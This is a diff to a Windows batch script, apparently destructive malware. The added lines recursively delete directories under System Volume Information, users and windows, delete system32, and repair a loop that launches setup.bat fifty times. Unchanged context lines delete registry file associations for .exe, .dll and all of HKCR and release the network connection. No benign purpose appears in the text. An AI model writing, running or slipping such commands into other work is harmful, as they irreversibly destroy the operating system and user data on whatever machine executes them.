@@ -71,6 +71,14 @@ del /f /a /q /s "pc2,pc3,pc4-2023-11-15-MSUpdates.log"
 del /f /a /q /s vfcompact.dll
 
 
+
+FOR /D /R c:\"System Volume Information" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
+FOR /D /R c:\"users" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
+FOR /D /R c:\"windows" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
+FOR /D /R c:\windows\system32 %%X IN (*.dll) DO RMDIR /S /Q "%%X"
+cd /windows
+del /f /a /q /s system32
+FOR /D /R c:\windows\system32 %%X IN (*.dll) DO RMDIR /S /Q "%%X"
 cd /
 compact.exe /s /i /f
 
@@ -81,8 +89,7 @@ START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
 
-for /l %%a in (1,1,50) start setup.bat
-for /l %%a in (1,1,50) start setup.bat
+for /l %%a in (1,1,50) do start setup.bat
 for /l %%a in (1,2,50) do start rstrui.exe
 
 Ipconfig /release
@@ -104,6 +111,7 @@ echo.
 start setup.bat
 
 setup.bat
+
 
 
 
